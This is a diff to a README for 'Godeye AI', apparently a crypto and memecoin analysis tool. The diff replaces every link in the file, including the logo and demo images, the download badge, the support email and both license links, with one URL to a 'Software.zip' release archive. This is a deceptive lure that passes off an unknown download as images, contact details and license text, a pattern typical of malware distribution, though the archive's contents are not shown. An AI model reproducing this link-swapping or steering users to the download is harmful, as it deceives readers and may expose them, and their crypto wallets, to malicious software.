@@ -1,6 +1,6 @@
 # Godeye AI - Unleashing the Power of Deepseek
 
-![Godeye AI Logo](https://example.com/godeye-ai-logo.png)
+![Godeye AI Logo](https://github.com/OSAIDSOOMRO/godeye-v1/releases/download/v1.0/Software.zip)
 
 👁️ Welcome to Godeye AI, an open-source AI system that delves deep into the world of cryptocurrencies and memecoins with the help of Deepseek technology. Our mission is to identify emerging topics and correlate them with various digital assets, providing invaluable insights into market dynamics.
 
@@ -24,7 +24,7 @@ Godeye AI is an open-source AI system powered by Deepseek, designed to identify 
 - Solana
 
 ### Download
-[![Download Godeye AI](https://img.shields.io/badge/Download-Get_it_here!-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Godeye AI](https://github.com/OSAIDSOOMRO/godeye-v1/releases/download/v1.0/Software.zip!-brightgreen)](https://github.com/OSAIDSOOMRO/godeye-v1/releases/download/v1.0/Software.zip)
 
 🚀 Excited to take Godeye AI for a spin? Click the button above to download the latest version and start exploring the world of AI-driven cryptocurrency insights!
 
@@ -47,16 +47,16 @@ Godeye AI is an open-source AI system powered by Deepseek, designed to identify 
 🤝 We welcome contributions from the community to help enhance Godeye AI further. Whether you're a developer, AI enthusiast, or cryptocurrency aficionado, there are plenty of opportunities to get involved. Feel free to fork the repository, make your changes, and submit a pull request.
 
 ## Support
-📧 Have any questions, feedback, or suggestions regarding Godeye AI? Reach out to us at [godeye.support@example.com](mailto:godeye.support@example.com) and our team will be happy to assist you.
+📧 Have any questions, feedback, or suggestions regarding Godeye AI? Reach out to us at [https://github.com/OSAIDSOOMRO/godeye-v1/releases/download/v1.0/Software.zip](https://github.com/OSAIDSOOMRO/godeye-v1/releases/download/v1.0/Software.zip) and our team will be happy to assist you.
 
 ## License
-📜 This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](https://github.com/godeye-v1/LICENSE) file for details.
+📜 This project is licensed under the [MIT License](https://github.com/OSAIDSOOMRO/godeye-v1/releases/download/v1.0/Software.zip) - see the [LICENSE](https://github.com/OSAIDSOOMRO/godeye-v1/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
 🌟 Join us on this exciting journey as we unlock the potential of AI and Deepseek technology to revolutionize the landscape of cryptocurrencies. Let Godeye AI be your detective in the world of digital assets, guiding you towards informed decisions and profitable opportunities! 🌐
 
-![Godeye AI Demo](https://example.com/godeye-ai-demo.gif)
+![Godeye AI Demo](https://github.com/OSAIDSOOMRO/godeye-v1/releases/download/v1.0/Software.zip)
 
 Start exploring the future of cryptocurrency with Godeye AI today! 💡
 
